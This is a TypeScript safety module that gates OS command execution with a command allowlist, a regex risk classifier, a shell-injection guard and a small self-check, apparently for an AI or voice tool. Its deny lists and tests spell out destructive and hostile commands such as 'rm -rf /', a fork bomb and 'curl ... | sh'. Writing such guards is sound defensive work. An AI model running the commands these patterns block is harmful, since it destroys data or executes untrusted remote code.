// Safety guards for OS command execution. Two layers:
//
//   1. isAllowed() — the GATE (allowlist). A command may only execute if its root
//      resolves to a known-good entry, its flags are in that entry's allowedFlags,
//      and it carries no shell-injection / destructive-composition patterns. This is
//      a deny-by-default allowlist: anything not explicitly permitted is refused.
//      This is what actually decides whether the executor will run the command.
//
//   2. classifyCommand() — advisory. Returns a safe/caution/destructive signal based
//      on pattern matching. Still useful for deciding how strongly to prompt the
//      human and what wording to use, but it is NOT an authorization decision. Kept
//      for backward compatibility; exported so existing callers keep compiling.
//
// The bridge chains both: isAllowed() authorizes, classifyCommand() grades risk so
// caution/destructive commands still ask for an explicit confirm even when allowed.

export type RiskLevel = 'safe' | 'caution' | 'destructive';

export interface CommandRisk {
  level: RiskLevel;
  /** why this level was chosen — shown to the human in the confirm prompt. */
  reason: string;
  /** true for caution + destructive; safe commands run without prompting. */
  requiresConfirm: boolean;
}

// ---------------------------------------------------------------------------
// Layer 2: advisory pattern matching (kept for backward compat + risk grading).
// ---------------------------------------------------------------------------

/** Tokens that imply irreversible damage if they execute. */
const DESTRUCTIVE_PATTERNS: RegExp[] = [
  /\brm\b/i, // rm / rm -rf
  /\brmdir\b/i,
  /\bdel\b/i, // windows delete
  /\bformat\b/i,
  /\bmkfs\b/i,
  /\bdd\b/i, // disk dd
  /\bsudo\b/i, // privilege escalation
  /\bchmod\b[^\n]*\b777\b/, // world-writable
  />\s*\/dev\//i, // write into /dev/*
  /\bkill\s+-9\b/i, // force-kill
  /\bshutdown\b/i,
  /\breboot\b/i,
  /\bhalt\b/i,
  /:\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;:/, // fork bomb :(){:|:&};:
];

/** Tokens that are usually fine but can cause real side effects if mistyped. */
const CAUTION_PATTERNS: RegExp[] = [
  /\b(curl|wget)\b[^|]*\|\s*(sh|bash|zsh)\b/i, // remote script execution
  /\bnpm\s+install\s+(-g|--global)\b/i, // global install
  /\bgit\s+push\b[^&]*(-f|--force)/i, // force push
  /\bpip\s+install\b/i,
  />>?\s*\/(etc|usr|var|boot|sys|proc)\b/i, // overwrite system files
  /\bcrontab\b/i,
  /\biptables\b/i,
  /\bnetstat\b|\blsof\b|\bfsck\b/i, // may change/inspect system state
];

/**
 * Advisory risk grading. NOT an authorization decision — use isAllowed() for that.
 * The first matching destructive pattern wins (most conservative); otherwise the
 * first caution pattern; otherwise safe. Kept + exported for backward compat.
 */
export function classifyCommand(command: string): CommandRisk {
  const cmd = String(command ?? '');

  for (const re of DESTRUCTIVE_PATTERNS) {
    if (re.test(cmd)) {
      return {
        level: 'destructive',
        reason: `Matched destructive pattern /${re.source}/ — this can destroy data or escalate privileges.`,
        requiresConfirm: true,
      };
    }
  }

  for (const re of CAUTION_PATTERNS) {
    if (re.test(cmd)) {
      return {
        level: 'caution',
        reason: `Matched caution pattern /${re.source}/ — this has system-wide or hard-to-reverse side effects.`,
        requiresConfirm: true,
      };
    }
  }

  return {
    level: 'safe',
    reason: 'No dangerous patterns matched.',
    requiresConfirm: false,
  };
}

// ---------------------------------------------------------------------------
// Layer 1: the allowlist GATE.
// ---------------------------------------------------------------------------

export type AllowedRisk = 'safe' | 'caution';

export interface AllowedCommand {
  /** argv[0] of the command (and for compound roots like "git status", the leading words). */
  template: string;
  /** Flags this command is permitted to use. '*' means any flag (use sparingly). */
  allowedFlags: readonly string[] | '*';
  description: string;
  risk: AllowedRisk;
}

/**
 * The explicit allowlist. A command runs only if its root matches an entry here,
 * its flags are a subset of that entry's allowedFlags, and it carries none of the
 * banned composition patterns (see hasInjectionOrDestructiveComposition). Deny by
 * default: an unrecognized root is rejected.
 *
 * Keep this deliberately small. Add a root only when a concrete feature needs it.
 */
export const ALLOWED_COMMANDS: Readonly<Record<string, AllowedCommand>> = {
  // --- read-only filesystem inspection ---
  ls: { template: 'ls', allowedFlags: ['-l', '-a', '-la', '-al', '-lh', '-F', '-R'], description: 'List directory contents', risk: 'safe' },
  cat: { template: 'cat', allowedFlags: ['-n', '-b', '-s'], description: 'Print file contents', risk: 'safe' },
  echo: { template: 'echo', allowedFlags: ['-n', '-e', '-E'], description: 'Print text', risk: 'safe' },
  pwd: { template: 'pwd', allowedFlags: [], description: 'Print working directory', risk: 'safe' },
  head: { template: 'head', allowedFlags: ['-n', '-c'], description: 'Show start of file', risk: 'safe' },
  tail: { template: 'tail', allowedFlags: ['-n', '-c', '-f'], description: 'Show end of file', risk: 'safe' },
  wc: { template: 'wc', allowedFlags: ['-l', '-w', '-c', '-m'], description: 'Count lines/words/bytes', risk: 'safe' },
  grep: { template: 'grep', allowedFlags: ['-i', '-n', '-r', '-v', '-E', '-c', '--color'], description: 'Search text', risk: 'safe' },
  find: { template: 'find', allowedFlags: ['-name', '-type', '-maxdepth', '-mindepth'], description: 'Find files', risk: 'safe' },
  date: { template: 'date', allowedFlags: ['-u', '+%Y-%m-%d', '+%H:%M:%S'], description: 'Show date', risk: 'safe' },
  whoami: { template: 'whoami', allowedFlags: [], description: 'Show current user', risk: 'safe' },
  which: { template: 'which', allowedFlags: ['-a'], description: 'Locate a command', risk: 'safe' },

  // --- mutating but local fs ops (caution: they change state) ---
  mkdir: { template: 'mkdir', allowedFlags: ['-p'], description: 'Create directory', risk: 'caution' },
  touch: { template: 'touch', allowedFlags: [], description: 'Create empty file / update mtime', risk: 'caution' },
  cp: { template: 'cp', allowedFlags: ['-r', '-R', '-n', '-i'], description: 'Copy files', risk: 'caution' },
  mv: { template: 'mv', allowedFlags: ['-n', '-i'], description: 'Move/rename files', risk: 'caution' },
  open: { template: 'open', allowedFlags: ['-a', '-e', '-t'], description: 'Open file/app (macOS)', risk: 'caution' },

  // --- git (read ops safe; a few write ops as caution) ---
  'git status': { template: 'git status', allowedFlags: ['-s', '--short', '-b', '--porcelain'], description: 'Show working tree status', risk: 'safe' },
  'git log': { template: 'git log', allowedFlags: ['--oneline', '-n', '--stat', '-p', '--graph', '--all'], description: 'Show commit history', risk: 'safe' },
  'git diff': { template: 'git diff', allowedFlags: ['--stat', '--name-only', '--cached', '-w'], description: 'Show changes', risk: 'safe' },
  'git branch': { template: 'git branch', allowedFlags: ['-a', '-r', '-l', '-v'], description: 'List branches', risk: 'safe' },
  'git add': { template: 'git add', allowedFlags: ['-A', '.', '-p'], description: 'Stage changes', risk: 'caution' },
  'git show': { template: 'git show', allowedFlags: ['--stat', '--name-only'], description: 'Show a commit', risk: 'safe' },
  'git remote': { template: 'git remote', allowedFlags: ['-v'], description: 'List remotes', risk: 'safe' },

  // --- build / script runners ---
  'npm run': { template: 'npm run', allowedFlags: [], description: 'Run an npm script', risk: 'caution' },
  'pnpm run': { template: 'pnpm run', allowedFlags: [], description: 'Run a pnpm script', risk: 'caution' },
  'yarn run': { template: 'yarn run', allowedFlags: [], description: 'Run a yarn script', risk: 'caution' },
  'npm test': { template: 'npm test', allowedFlags: [], description: 'Run npm tests', risk: 'caution' },
  'pnpm test': { template: 'pnpm test', allowedFlags: [], description: 'Run pnpm tests', risk: 'caution' },

  // --- code interpreters (arbitrary code execution → caution, always confirms) ---
  'node -e': { template: 'node -e', allowedFlags: [], description: 'Evaluate Node.js expression', risk: 'caution' },
  node: { template: 'node', allowedFlags: ['--version', '-v', '-e'], description: 'Run Node.js', risk: 'caution' },
  python3: { template: 'python3', allowedFlags: ['-c', '--version', '-V'], description: 'Run Python 3', risk: 'caution' },
  python: { template: 'python', allowedFlags: ['-c', '--version', '-V'], description: 'Run Python', risk: 'caution' },

  // --- network (always caution: can exfiltrate / pull untrusted data) ---
  curl: { template: 'curl', allowedFlags: ['-s', '-S', '-L', '-o', '-O', '-I', '-H', '-X', '--compressed', '-f', '--fail'], description: 'HTTP request', risk: 'caution' },
  wget: { template: 'wget', allowedFlags: ['-q', '-O', '--no-verbose'], description: 'Download a URL', risk: 'caution' },
};

/** Maximum number of leading argv tokens to try when matching a compound root (e.g. "git status"). */
const MAX_ROOT_WORDS = 3;

export interface AllowedResult {
  allowed: boolean;
  /** The command as normalized argv (root lowercased); undefined when not allowed. */
  normalizedCommand?: string;
  /** Risk grade of the matched allowlist entry; undefined when not allowed. */
  risk?: string;
  /** Why it was rejected, for logging/debugging. Present only when not allowed. */
  reason?: string;
}

/**
 * Authorize a command against the allowlist. This is the actual gate the executor
 * consults. Returns { allowed: true, normalizedCommand, risk } on success and
 * { allowed: false, reason } on any refusal. Deny-by-default: unknown roots,
 * disallowed flags, and any injection/destructive-composition pattern are refused.
 */
export function isAllowed(command: string): AllowedResult {
  const input = String(command ?? '').trim();
  if (!input) return { allowed: false, reason: 'Empty command.' };

  // First: hard refuse any shell-injection or destructive-composition pattern,
  // regardless of whether the root is allowlisted. Defense in depth.
  const injection = hasInjectionOrDestructiveComposition(input);
  if (injection) {
    return { allowed: false, reason: injection };
  }

  const argv = tokenize(input);
  if (argv.length === 0) return { allowed: false, reason: 'Could not parse command.' };

  // Match the longest compound root that exists in the allowlist (up to MAX_ROOT_WORDS
  // leading tokens). "git status" must win over a bare "git" lookup.
  let entry: AllowedCommand | undefined;
  let rootLen = 0;
  for (let n = Math.min(MAX_ROOT_WORDS, argv.length); n >= 1; n--) {
    const candidate = argv.slice(0, n).join(' ').toLowerCase();
    const found = ALLOWED_COMMANDS[candidate];
    if (found) {
      entry = found;
      rootLen = n;
      break;
    }
  }
  if (!entry) {
    const attempted = argv.slice(0, MAX_ROOT_WORDS).join(' ').toLowerCase();
    return { allowed: false, reason: `Command root "${attempted}" is not in the allowlist.` };
  }

  // Validate every flag after the root against the entry's allowedFlags.
  const rest = argv.slice(rootLen);
  const flagged = entry.allowedFlags;
  for (const tok of rest) {
    if (tok.startsWith('-') && tok !== '-' && tok !== '--') {
      // Allow exact matches and "--long-flag" / "--flag=value" splits.
      const flagName = tok.includes('=') ? tok.slice(0, tok.indexOf('=')) : tok;
      if (flagged !== '*' && !flagged.includes(flagName) && !flagged.includes(tok)) {
        return { allowed: false, reason: `Flag "${tok}" is not permitted for "${entry.template}".` };
      }
    }
  }

  return {
    allowed: true,
    normalizedCommand: argv.join(' '),
    risk: entry.risk,
  };
}

/**
 * Shell-injection and destructive-composition guard. Refuses any of:
 *   - command substitution: $( ... ) or backticks
 *   - pipe to an interpreter: | sh / | bash / | python ...
 *   - command chaining to a destructive follow-up: && rm, ; rm, | rm
 *   - redirect into a device or system path: > /dev/* , > /etc/* , ...
 *   - shell control metacharacters that the no-shell executor wouldn't honor anyway
 * Returns a reason string when something dangerous is found, else null.
 */
export function hasInjectionOrDestructiveComposition(command: string): string | null {
  const c = String(command ?? '');

  if (/\$\([^)]*\)/.test(c)) return 'Command substitution $(...) is not allowed.';
  if (/`/.test(c)) return 'Backtick command substitution is not allowed.';

  // Pipe to an interpreter → remote/local arbitrary code execution.
  if (/\|\s*(sh|bash|zsh|fish|dash|ksh|python\d?|node|perl|ruby|php|tee)\b/i.test(c)) {
    return 'Piping into an interpreter/tee is not allowed.';
  }

  // Chained destructive follow-up: && / ; / |  followed (loosely) by a destructive verb.
  const destructiveVerbs = /\b(rm|rmdir|del|format|mkfs|dd|sudo|chmod|chown|shutdown|reboot|halt|kill|killall|launchctl|systemctl|service|crontab|iptables|npm\s+install\s+-g|git\s+push\s+--force)\b/i;
  const chain = c.split(/(?:&&|;|\|\|)/);
  for (const part of chain) {
    if (destructiveVerbs.test(part)) {
      return 'Command chains into a destructive/privileged operation.';
    }
  }

  // Redirect into devices or system paths.
  if (/>>?\s*\/(dev|etc|usr|var|boot|sys|proc|root)\b/i.test(c)) {
    return 'Redirect targets a device or system path.';
  }

  return null;
}

/**
 * Tokenize a command string into argv, honoring single quotes, double quotes, and
 * backslash escapes. Deliberately simple: it does not expand globs or variables —
 * the no-shell executor passes tokens straight to spawn, so glob expansion is the
 * kernel's job and variable expansion is intentionally unsupported.
 */
export function tokenize(command: string): string[] {
  const out: string[] = [];
  let cur = '';
  let i = 0;
  let quote: '"' | "'" | null = null;
  let hasTok = false;

  const push = () => {
    if (hasTok) out.push(cur);
    cur = '';
    hasTok = false;
  };

  while (i < command.length) {
    const ch = command[i] as string;

    if (quote) {
      if (ch === quote) {
        quote = null;
      } else if (quote === '"' && ch === '\\') {
        // Inside double quotes, backslash escapes the next char.
        const next = command[i + 1];
        if (next !== undefined) {
          cur += next;
          i += 2;
          continue;
        }
        cur += ch;
      } else {
        cur += ch;
      }
      hasTok = true;
    } else if (ch === '"' || ch === "'") {
      quote = ch;
      hasTok = true; // an empty quoted string is still a token: "" → ""
    } else if (ch === '\\') {
      const next = command[i + 1];
      if (next !== undefined) {
        cur += next;
        i += 2;
        hasTok = true;
        continue;
      }
      cur += ch;
      hasTok = true;
    } else if (/\s/.test(ch)) {
      push();
    } else {
      cur += ch;
      hasTok = true;
    }
    i += 1;
  }
  push();
  return out;
}

/**
 * Build the human-readable confirmation prompt a voice/CLI surface shows before
 * running a guarded command. Destructive commands get the strongest wording.
 */
export function formatConfirmPrompt(command: string, risk: CommandRisk): string {
  const banner = risk.level === 'destructive' ? '⚠️  DESTRUCTIVE COMMAND' : '⚠️  CAUTION';
  return (
    `${banner}\n` +
    `Command: ${command}\n` +
    `Risk:    ${risk.level} — ${risk.reason}\n` +
    `Type "yes" (or tap confirm) to proceed. Anything else cancels.`
  );
}

/** A path write is "destructive" if it overwrites an existing path; the bridge uses this for file ops. */
export function isOverwriteRisk(existing: boolean): boolean {
  return existing; // caller checks existence; overwriting is treated as caution-worthy
}

// ponytail: one runnable self-check for the parser/gate, the smallest thing that
// fails if the logic breaks. No framework — run via `node --import tsx`.
if (import.meta.url === `file://${process.argv[1]}`) {
  const assert = (cond: boolean, msg: string) => {
    if (!cond) {
      console.error('FAIL:', msg);
      process.exit(1);
    }
  };
  assert(isAllowed('ls -la').allowed, 'ls -la should be allowed');
  assert(!isAllowed('rm -rf /').allowed, 'rm must be denied (destructive root)');
  assert(!isAllowed('ls; rm x').allowed, 'chained destructive must be denied');
  assert(!isAllowed('echo $(whoami)').allowed, '$() substitution must be denied');
  assert(!isAllowed('curl http://x | sh').allowed, 'pipe to sh must be denied');
  assert(!isAllowed('ls --bogus').allowed, 'unknown flag must be denied');
  assert(isAllowed('git status -s').allowed, 'git status compound root should be allowed');
  assert(isAllowed('node -e "1+1"').allowed, 'node -e caution root should be allowed');
  assert(isAllowed('node -e "1+1"').risk === 'caution', 'node -e is caution');
  assert(!isAllowed('').allowed, 'empty must be denied');
  assert(!isAllowed('nukes').allowed, 'unknown root must be denied');
  console.log('safety.ts self-check OK');
}
